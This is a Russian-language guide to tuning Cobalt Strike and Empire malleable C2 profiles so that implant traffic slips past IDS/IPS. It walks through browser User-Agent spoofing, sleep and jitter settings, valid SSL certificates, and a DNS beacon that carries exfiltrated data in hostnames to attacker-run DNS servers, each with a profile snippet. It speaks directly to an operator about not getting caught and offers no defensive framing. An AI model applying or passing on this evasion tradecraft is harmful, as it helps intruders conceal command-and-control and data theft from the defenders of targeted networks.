**Настройка C2-профилей для обхода IDS/IPS**

### 🎯 Главная цель

C2-фреймворки (**Cobalt Strike**, **Empire**) имеют **malleable C2-профили**. Они позволяют **тонко настроить трафик**, чтобы **не совпадать с сигнатурами IDS/IPS**.

**Главное правило:** **Не использовать дефолтный профиль.** **Создавать свой.**


### 📌 Переменные, которые можно контролировать

| Переменная | Что делает | Зачем |
|------------|------------|-------|
| **User-Agent** | Подменяет стандартный User-Agent | Дефолтный UA фреймворка **палится**. Замени на **безобидный** (например, Chrome). |
| **Sleep Time** | Интервал между **check-in'ами** (маячками) | Чем **реже** — тем **сложнее** заметить. Но **медленнее** управление. |
| **Jitter** | **Случайность** к sleep time | **30%** = sleep ±30%. **Ломает паттерны** для IDS. |
| **SSL Certificate** | Свой **валидный** SSL-сертификат | **Легитимный** сертификат = **доверие** от IDS. **Стоит потратить время.** |
| **Beacon (DNS)** | Настройка **DNS-запросов** для exfil | **Hostname** содержит **данные**. **DNS-серверы** — твои. |


### 🔍 Разбор каждой переменной

### 1. **User-Agent**

**Проблема:** Дефолтный UA Cobalt Strike **известен** IDS/IPS.

**Решение:**
- **Установи** UA как **обычный браузер** (Chrome, Firefox).
- **Проверь**, что трафик **выглядит** как веб-серфинг.

**Пример в профиле:**
```
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
```

### 2. **Sleep Time**

**Проблема:** Частые check-in'ы **заметны**.

**Решение:**
- **Увеличь** sleep time (например, **60 секунд**).
- **Меньше трафика** = **меньше подозрений**.

**Пример:**
```
set sleeptime "60000";  # 60 секунд
```

### 3. **Jitter**

**Проблема:** Регулярные интервалы **детектируются**.

**Решение:**
- **Добавь** jitter (например, **30%**).
- Sleep time **варьируется** ±30%.

**Пример:**
```
set jitter "30";
```

### 4. **SSL Certificate**

**Проблема:** Самоподписанный сертификат **палится**.

**Решение:**
- **Купи** валидный сертификат (Let's Encrypt, платный).
- **Установи** его в C2-профиль.

**Пример:**
```
https-certificate {
    set keystore "mycert.store";
    set password "password";
}
```

### 5. **Beacon (DNS)**

**Проблема:** DNS-запросы **логируются**, но **данные** можно **спрятать**.

**Решение:**
- **Hostname** содержит **exfil-данные**.
- **DNS-серверы** — твои.

**Пример:**
```
dns-beacon {
    set beacon "data.example.com";
    set dns_idle "0.0.0.0";
}
```


### 📌 Итог

| Переменная | Зачем | Как |
|------------|-------|-----|
| **User-Agent** | Не палиться | Подменить на браузер |
| **Sleep Time** | Меньше трафика | Увеличить |
| **Jitter** | Ломать паттерны | Добавить 30% |
| **SSL Cert** | Доверие | Купить/получить Let's Encrypt |
| **DNS Beacon** | Exfil через DNS | Настроить hostname и DNS |

**Ключевое:**
- **Дефолтный профиль** = **детект**.
- **Свой профиль** = **обход IDS/IPS**.
- **Тонкая настройка** = **невидимость**.

**Пример готового профиля:** [CobaltStrike Guideline Profile](https://github.com/RedSiege/CobaltStrike-Profiles).

**Без кастомного профиля — тебя заметят.**
